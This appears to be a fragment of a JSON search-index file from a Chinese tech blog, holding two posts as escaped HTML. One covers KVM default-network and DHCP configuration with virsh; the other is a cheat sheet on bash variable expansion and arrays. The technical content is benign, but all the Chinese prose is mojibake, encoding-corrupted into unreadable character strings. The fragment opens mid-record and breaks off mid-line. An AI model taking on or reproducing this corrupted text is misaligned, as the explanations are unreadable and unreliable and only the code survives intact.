\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9: virbr0-nic: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc noop state DOWN qlen \u003cspan class=\"m\"\u003e500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªå¦‚æœè™šæœºéƒ½æ˜¯é™æ€IPï¼Œä¸”ä¸åšNATçš„è¯ï¼Œåˆ™æ— å¿…è¦ä¿ç•™ï¼Œå¯ä»¥å½»åº•åˆ æ‰ã€‚\u003c/p\u003e\n\u003cp\u003ekvmåˆ é™¤æ‰ç¼ºçœç½‘ç»œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-destroy default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-undefine default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆå¦‚æœéç”¨ä¸å¯ï¼Œè¿˜éœ€è¦ç»™ç‰¹å®šè™šæœºç”¨dhcpæŒ‡å®šå›ºå®šIP\næ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹ç¼ºçœç½‘ç»œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ virsh net-list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Name                 State      Autostart     Persistent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e----------------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e default              active     yes           yes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ‰¾å‡ºè™šæœºçš„macåœ°å€\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"n\"\u003evirsh\u003c/span\u003e \u003cspan class=\"n\"\u003edumpxml\u003c/span\u003e \u003cspan class=\"n\"\u003evis\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e33\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003egrep\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;mac\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003emac\u003c/span\u003e \u003cspan class=\"n\"\u003eaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;f0:00:ac:10:0a:21\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘ç½‘ç»œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ virsh net-edit default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;network\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;name\u0026gt;\u003c/span\u003edefault\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;uuid\u0026gt;\u003c/span\u003e58e86841-ef4b-4d63-bf4f-7888515b8474\u003cspan class=\"nt\"\u003e\u0026lt;/uuid\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;forward\u003c/span\u003e \u003cspan class=\"na\"\u003emode=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;nat\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;bridge\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;virbr0\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003estp=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;on\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003edelay=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;mac\u003c/span\u003e \u003cspan class=\"na\"\u003eaddress=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;52:54:00:6C:22:2C\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;ip\u003c/span\u003e \u003cspan class=\"na\"\u003eaddress=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;192.168.122.1\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003enetmask=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;255.255.255.0\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;dhcp\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;range\u003c/span\u003e \u003cspan class=\"na\"\u003estart=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;192.168.122.2\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003eend=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;192.168.122.254\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/dhcp\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;/ip\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/network\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨rangeä¸‹é¢æ¥ä¸€åˆ—\u003c/p\u003e","title":"KVMç½‘ç»œå¦‚ä½•è®¾ç½®DHCP"},{"content":"å˜é‡å­ä¸²\n${var} è¿”å›å˜é‡varçš„å†…å®¹ï¼Œå•ç‹¬ä½¿ç”¨æ—¶æœ‰æ²¡æœ‰{}ä¸€æ ·ï¼Œæ··åˆå¤šä¸ªå˜é‡å’Œå¸¸é‡æ—¶ï¼Œç”¨{}ç•Œå®šå˜é‡å\n${#var} è¿”å›å˜é‡varå†…å®¹çš„é•¿åº¦\n${var:offset} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„å­å­—ç¬¦ä¸²ï¼Œoffsetä»0å¼€å§‹\n${var:offset:length} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–é•¿åº¦ä¸ºlengthçš„å­å­—ç¬¦ä¸²\n${var#*.} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦\n${var##*.} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦\n${var%.*} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦\n${var%%.*} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦\nç¤ºä¾‹ï¼š\nvar=file.txt.tar.gz ${var#*.} #å†…å®¹ä¸º\u0026#34;txt.tar.gz\u0026#34; ${var##*.} #å†…å®¹ä¸º\u0026#34;gz\u0026#34; ${var%.*} #å†…å®¹ä¸º\u0026#34;file.txt.tar\u0026#34; ${var%%.*} #å†…å®¹ä¸º\u0026#34;file\u0026#34; ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒPatternå’Œè¡¨è¾¾å¼ï¼Œç¤ºä¾‹ï¼š\nvar=/home/xxx/aaa/file.txt #å‡è®¾xxxä¸ºå½“å‰ç”¨æˆ· # ä»è·¯å¾„ä¸­è·å–æ–‡ä»¶å ${var##*/} #å†…å®¹ä¸º\u0026#34;file.txt\u0026#34; # å°†ç»å¯¹è·¯å¾„è½¬ä¸ºç›¸å¯¹è·¯å¾„ # whoamiæ˜¯è·å–å½“å‰ç”¨æˆ·åï¼Œä½¿ç”¨$()æ‰§è¡Œå­shellï¼Œ$(whoami)å°†å¾—åˆ°xxx ~${var#*$(whoami)} #å†…å®¹ä¸º\u0026#34;~/aaa/file.txt\u0026#34; ${var/pattern/string} ä½¿ç”¨stringä»£æ›¿ç¬¬ä¸€ä¸ªåŒ¹é…çš„pattern\n${var//pattern/string} ä½¿ç”¨stringä»£æ›¿æ‰€æœ‰åŒ¹é…çš„pattern\n${var,} é¦–å­—æ¯è½¬å°å†™\n${var,,} å…¨éƒ¨è½¬å°å†™\n${var^} é¦–å­—æ¯è½¬å¤§å†™\n${var^^} å…¨éƒ¨è½¬å¤§å†™\nç‰¹æ®Šæ‰©å±•å˜é‡\n${var-word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n${var:-word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n${var+word} å¦‚æœå˜é‡varæœ‰å€¼ï¼ˆåŒ…æ‹¬ç©ºä¸²\u0026quot;\u0026quot;ï¼‰ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\nvar1=foo var2= ${var1-word} # å†…å®¹ä¸º\u0026#34;foo\u0026#34; echo ${var2-word} # å†…å®¹ä¸º\u0026#34;\u0026#34; echo ${var2:-word} # å†…å®¹ä¸º\u0026#34;word\u0026#34; ${var:+word} å¦‚æœå˜é‡varæœ‰å€¼ä¸”ä¸ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n${var=word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word\n${var:=word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºä¸²ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word\n${var?word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œå°†å­—ç¬¦ä¸²wordä½œä¸ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¦åˆ™è¿”å›å˜é‡varçš„å€¼\n${var:?word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºä¸²ï¼Œå°†å­—ç¬¦ä¸²wordä½œä¸ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¦åˆ™è¿”å›å˜é‡varçš„å€¼\næ•°ç»„\narray=(1 2 3 a b c) å®šä¹‰ä¸€ä¸ªåä¸ºarrayçš„æ•°ç»„ï¼ŒåŒ…å«äº†6ä¸ªå…ƒç´ ï¼Œå…ƒç´ å­—æ®µç±»å‹ä¸éœ€è¦ç»Ÿä¸€\n${array[index]} è®¿é—®æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œindexä»0å¼€å§‹ï¼Œå¦‚æœä¸ºè´Ÿè¡¨ç¤ºä»æ•°ç»„çš„æœ«å°¾å¼€å§‹çš„åç§»é‡\n${array[*]} è·å–æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ \n${array[@]} è·å–æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ \n${#array[*]} è·å–æ•°ç»„çš„é•¿åº¦\n${#array[@]} è·å–æ•°ç»„çš„é•¿åº¦\n${!array[@]} è·å–æ•°ç»„ç´¢å¼•åˆ—è¡¨ï¼Œè¿”å› 0 1 2 3 4 5\narray+=(4 d) å‘æ•°ç»„ä¸­æ·»åŠ å…ƒç´ ï¼Œæ•°ç»„å†…å®¹ä¸º 1 2 3 a b c 4 d\nunset array[6] åˆ é™¤ç¬¬ 7 ä¸ªå…ƒç´ ï¼Œæ•°ç»„å†…å®¹ä¸º 1 2 3 a b c d\nunset array[-1] åˆ é™¤å€’æ•°ç¬¬ 1 ä¸ªå…ƒç´ ï¼Œæ•°ç»„å†…å®¹ä¸º 1 2 3 a b c\nå¤šè¡Œå­—ç¬¦ä¸²å˜é‡\nvar=$(cat \u0026lt;\u0026lt;- \u0026#39;EOF\u0026#39; line1 line2 ... EOF) æˆ–è€…ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·ï¼ˆå•å¼•å·ä¸­${}å’Œ$()ç­‰éƒ½ä¸ä¼šå–è¡¨è¾¾å¼çš„å€¼ï¼ŒåŒå¼•å·ä¸­æ‰ä¼šï¼‰ï¼š\nvar=\u0026#39;line1 line2 ...\u0026#39; æ³¨æ„ä¸Šè¿°ä¸¤ç§å†™æ³•çš„å·®åˆ«ï¼Œé¿å…ä¸ºå˜é‡å†…å®¹å¸¦æ¥ä¸å¿…è¦çš„ç©ºè¡Œã€‚é€šè¿‡å¾ªç¯å¯ä¾æ¬¡å¾—åˆ°å˜é‡ä¸­çš„æ¯ä¸€è¡Œï¼š\nwhile read -r line; do echo $line done \u0026lt;\u0026lt;\u0026lt; $var Shellç³»ç»Ÿå˜é‡\n$1 è¡¨ç¤ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ$2 è¡¨ç¤ºç¬¬äºŒä¸ªå‚æ•° \u0026hellip;\n$# å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°\n$0 å½“å‰Shellè„šæœ¬ç¨‹åºçš„åç§°\n$? å‰ä¸€ä¸ªå‘½ä»¤æˆ–å‡½æ•°çš„è¿”å›ç \n$* ä»¥ \u0026ldquo;å‚æ•°1 å‚æ•°2 \u0026hellip; \u0026quot; å½¢å¼è·å–æ‰€æœ‰å‚æ•°\n$@ ä»¥ \u0026ldquo;å‚æ•°1\u0026rdquo; \u0026ldquo;å‚æ•°2\u0026rdquo; \u0026hellip; å½¢å¼è·å–æ‰€æœ‰å‚æ•°\n$$ æœ¬ç¨‹åºçš„è¿›ç¨‹IDï¼Œå³PID\n$! ä¸Šä¸€ä¸ªå‘½ä»¤çš„PID\n$PPID çˆ¶è¿›ç¨‹çš„PID\n$UID æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„å½“å‰ç”¨æˆ·ID\nå˜é‡è¾“å‡º\nå˜é‡å†…å®¹çš„è¾“å‡ºä½¿ç”¨ echo å‘½ä»¤ã€‚\nå¦‚æœæœªä½¿ç”¨ echoï¼Œåˆ™ä¼šå°†å˜é‡å†…å®¹å½“æˆ Shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¸¸ç”¨äºè°ƒç”¨æŸä¸ªç¨‹åºå¹¶ä¼ é€’å‚æ•°ï¼Œå¦‚ï¼šåº”ç”¨ç¨‹åºå¯åŠ¨è„šæœ¬ã€‚\n","permalink":"https://rendoumi.com/posts/20231212-shell/","summary":"\u003cp\u003e\u003cstrong\u003eå˜é‡å­ä¸²\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e${var} è¿”å›å˜é‡varçš„å†…å®¹ï¼Œå•ç‹¬ä½¿ç”¨æ—¶æœ‰æ²¡æœ‰{}ä¸€æ ·ï¼Œæ··åˆå¤šä¸ªå˜é‡å’Œå¸¸é‡æ—¶ï¼Œç”¨{}ç•Œå®šå˜é‡å\u003c/p\u003e\n\u003cp\u003e${#var} è¿”å›å˜é‡varå†…å®¹çš„é•¿åº¦\u003c/p\u003e\n\u003cp\u003e${var:offset} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„å­å­—ç¬¦ä¸²ï¼Œoffsetä»0å¼€å§‹\u003c/p\u003e\n\u003cp\u003e${var:offset:length} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–é•¿åº¦ä¸ºlengthçš„å­å­—ç¬¦ä¸²\u003c/p\u003e\n\u003cp\u003e${var#*.} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦\u003c/p\u003e\n\u003cp\u003e${var##*.} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦\u003c/p\u003e\n\u003cp\u003e${var%.*} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦\u003c/p\u003e\n\u003cp\u003e${var%%.*} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦\u003c/p\u003e\n\u003cp\u003eç¤ºä¾‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003efile.txt.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e#*.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#å†…å®¹ä¸º\u0026#34;txt.tar.gz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e##*.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"c1\"\u003e#å†…å®¹ä¸º\u0026#34;gz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e%.*\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#å†…å®¹ä¸º\u0026#34;file.txt.tar\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e%%.*\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"c1\"\u003e#å†…å®¹ä¸º\u0026#34;file\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒPatternå’Œè¡¨è¾¾å¼ï¼Œç¤ºä¾‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/xxx/aaa/file.txt \u003cspan class=\"c1\"\u003e#å‡è®¾xxxä¸ºå½“å‰ç”¨æˆ·\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä»è·¯å¾„ä¸­è·å–æ–‡ä»¶å\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e##*/\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#å†…å®¹ä¸º\u0026#34;file.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å°†ç»å¯¹è·¯å¾„è½¬ä¸ºç›¸å¯¹è·¯å¾„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# whoamiæ˜¯è·å–å½“å‰ç”¨æˆ·åï¼Œä½¿ç”¨$()æ‰§è¡Œå­shellï¼Œ$(whoami)å°†å¾—åˆ°xxx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e~\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e#*\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#å†…å®¹ä¸º\u0026#34;~/aaa/file.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e${var/pattern/string} ä½¿ç”¨stringä»£æ›¿ç¬¬ä¸€ä¸ªåŒ¹é…çš„pattern\u003c/p\u003e\n\u003cp\u003e${var//pattern/string} ä½¿ç”¨stringä»£æ›¿æ‰€æœ‰åŒ¹é…çš„pattern\u003c/p\u003e\n\u003cp\u003e${var,} é¦–å­—æ¯è½¬å°å†™\u003c/p\u003e\n\u003cp\u003e${var,,} å…¨éƒ¨è½¬å°å†™\u003c/p\u003e\n\u003cp\u003e${var^} é¦–å­—æ¯è½¬å¤§å†™\u003c/p\u003e\n\u003cp\u003e${var^^} å…¨éƒ¨è½¬å¤§å†™\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eç‰¹æ®Šæ‰©å±•å˜é‡\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e${var-word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\u003c/p\u003e\n\u003cp\u003e${var:-word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\u003c/p\u003e\n\u003cp\u003e${var+word} å¦‚æœå˜é‡varæœ‰å€¼ï¼ˆåŒ…æ‹¬ç©ºä¸²\u0026quot;\u0026quot;ï¼‰ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003efoo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar1\u003c/span\u003e\u003cspan class=\"p\"\u003e-word\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e        \u003cspan class=\"c1\"\u003e# å†…å®¹ä¸º\u0026#34;foo\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar2\u003c/span\u003e\u003cspan class=\"p\"\u003e-word\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# 